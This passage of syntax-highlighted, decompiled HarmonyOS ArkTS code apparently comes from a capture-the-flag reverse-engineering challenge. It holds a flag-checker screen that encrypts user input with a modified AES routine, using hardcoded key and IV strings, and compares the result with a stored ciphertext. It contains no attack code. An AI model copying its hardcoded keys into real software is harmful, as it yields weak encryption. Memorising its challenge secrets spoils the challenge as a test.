</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="n">x_2_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Stack</span><span class="p">.</span><span class="na">create</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Stack</span><span class="p">.</span><span class="na">width</span><span class="p">(</span><span class="err">&#39;</span><span class="n">100</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Stack</span><span class="p">.</span><span class="na">height</span><span class="p">(</span><span class="err">&#39;</span><span class="n">100</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Stack</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Image</span><span class="p">.</span><span class="na">create</span><span class="p">({</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">id</span><span class="p">:</span><span class="w"> </span><span class="n">16777217</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">type</span><span class="p">:</span><span class="w"> </span><span class="n">20000</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">params</span><span class="p">:</span><span class="w"> </span><span class="o">[]</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">bundleName</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">rev</span><span class="p">.</span><span class="na">astpr</span><span class="p">.</span><span class="na">aneasysystem</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">moduleName</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">entry</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Image</span><span class="p">.</span><span class="na">width</span><span class="p">(</span><span class="err">&#39;</span><span class="n">100</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Image</span><span class="p">.</span><span class="na">height</span><span class="p">(</span><span class="err">&#39;</span><span class="n">100</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Image</span><span class="p">.</span><span class="na">objectFit</span><span class="p">(</span><span class="n">globalThis</span><span class="p">.</span><span class="na">ImageFit</span><span class="p">.</span><span class="na">Cover</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Image</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">create</span><span class="p">({</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">space</span><span class="p">:</span><span class="w"> </span><span class="n">16</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">width</span><span class="p">(</span><span class="err">&#39;</span><span class="n">100</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">height</span><span class="p">(</span><span class="err">&#39;</span><span class="n">100</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">justifyContent</span><span class="p">(</span><span class="n">globalThis</span><span class="p">.</span><span class="na">FlexAlign</span><span class="p">.</span><span class="na">Center</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">alignItems</span><span class="p">(</span><span class="n">globalThis</span><span class="p">.</span><span class="na">HorizontalAlign</span><span class="p">.</span><span class="na">Center</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">padding</span><span class="p">(</span><span class="n">20</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Geek2025</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">fontSize</span><span class="p">(</span><span class="n">24</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">fontWeight</span><span class="p">(</span><span class="n">globalThis</span><span class="p">.</span><span class="na">FontWeight</span><span class="p">.</span><span class="na">Bold</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">fontColor</span><span class="p">(</span><span class="n">globalThis</span><span class="p">.</span><span class="na">Color</span><span class="p">.</span><span class="na">White</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">pop</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">create</span><span class="p">({</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">placeholder</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Please</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">flag</span><span class="err">&#39;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">text</span><span class="p">:</span><span class="w"> </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">inputText</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">width</span><span class="p">(</span><span class="err">&#39;</span><span class="n">88</span><span class="o">%</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">height</span><span class="p">(</span><span class="n">44</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">backgroundColor</span><span class="p">(</span><span class="err">&#39;#</span><span class="n">FFFFFFCC</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">borderRadius</span><span class="p">(</span><span class="n">12</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">padding</span><span class="p">(</span><span class="n">12</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">.</span><span class="na">onChange</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">inputText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">TextInput</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">createWithLabel</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Check</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">type</span><span class="p">:</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">ButtonType</span><span class="p">.</span><span class="na">Capsule</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">width</span><span class="p">(</span><span class="n">160</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">height</span><span class="p">(</span><span class="n">44</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">fontColor</span><span class="p">(</span><span class="err">&#39;#</span><span class="n">FFFFFF</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">backgroundColor</span><span class="p">(</span><span class="err">&#39;#</span><span class="n">1A73E8</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">onClick</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">checkAndShowResult</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Button</span><span class="p">.</span><span class="na">pop</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">observeComponentCreation2</span><span class="p">(</span><span class="n">function</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">bindPopup</span><span class="p">(</span><span class="n">x_2_2</span><span class="p">.</span><span class="na">isShowPopup</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">message</span><span class="p">:</span><span class="w"> </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">popupMessage</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">onWillDismiss</span><span class="p">:</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">onWillDismiss</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">x_2_2</span><span class="p">.</span><span class="na">isShowPopup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w"> </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Text</span><span class="p">.</span><span class="na">pop</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Column</span><span class="p">.</span><span class="na">pop</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">globalThis</span><span class="p">.</span><span class="na">Stack</span><span class="p">.</span><span class="na">pop</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r23</span><span class="p">.</span><span class="na">checkAndShowResult</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">checkAndShowResult</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="n">r0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$enterAsync</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">inputText</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">label_0</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="kd">const</span><span class="w"> </span><span class="n">r34</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">util_</span><span class="p">.</span><span class="na">TextEncoder</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="kd">const</span><span class="w"> </span><span class="n">r41</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r34</span><span class="p">.</span><span class="na">encodeInto</span><span class="p">(</span><span class="err">&#39;</span><span class="n">welcometosyc2025</span><span class="err">&#39;</span><span class="p">).</span><span class="na">slice</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="kd">const</span><span class="w"> </span><span class="n">r48</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r34</span><span class="p">.</span><span class="na">encodeInto</span><span class="p">(</span><span class="err">&#39;</span><span class="n">helloimsamsaramiao</span><span class="err">&#39;</span><span class="p">).</span><span class="na">slice</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="kd">const</span><span class="w"> </span><span class="n">r50</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">inputText</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">r0</span><span class="p">.</span><span class="na">$await</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">callNativeEncrypt</span><span class="p">(</span><span class="n">r50</span><span class="p">,</span><span class="w"> </span><span class="n">r41</span><span class="p">,</span><span class="w"> </span><span class="n">r48</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">r0</span><span class="p">.</span><span class="na">$suspend</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="kd">const</span><span class="w"> </span><span class="n">r54</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r0</span><span class="p">.</span><span class="na">$resumeValue</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">r0</span><span class="p">.</span><span class="na">$resumeMode</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">r54</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">targetCipher</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="k">this</span><span class="p">.</span><span class="na">popupMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Wrong</span><span class="w"> </span><span class="n">flag</span><span class="o">!</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">              </span><span class="k">this</span><span class="p">.</span><span class="na">popupMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Right</span><span class="w"> </span><span class="n">flag</span><span class="o">!</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">isShowPopup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="n">r54</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">$err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">console</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Encryption</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="err">&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">$err</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">this</span><span class="p">.</span><span class="na">popupMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Encryption</span><span class="w"> </span><span class="n">failed</span><span class="o">!</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">this</span><span class="p">.</span><span class="na">isShowPopup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">break</span><span class="w"> </span><span class="n">label_0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">r0</span><span class="p">.</span><span class="na">$resolve</span><span class="p">(</span><span class="n">undefined</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">popupMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Flag</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="kc">null</span><span class="o">!</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">this</span><span class="p">.</span><span class="na">isShowPopup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">r0</span><span class="p">.</span><span class="na">$resolve</span><span class="p">(</span><span class="n">undefined</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">$err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">r0</span><span class="p">.</span><span class="na">$reject</span><span class="p">(</span><span class="n">$err</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r23</span><span class="p">.</span><span class="na">callNativeEncrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="nf">callNativeEncrypt</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">,</span><span class="w"> </span><span class="n">p3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="n">r0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$enterAsync</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">r0</span><span class="p">.</span><span class="na">$resolve</span><span class="p">(</span><span class="n">nativeCrypto_</span><span class="p">.</span><span class="na">modifiedAESEncrypt</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">p2</span><span class="p">,</span><span class="w"> </span><span class="n">p3</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">$err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="n">r5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$err</span><span class="p">;</span><span class="w">
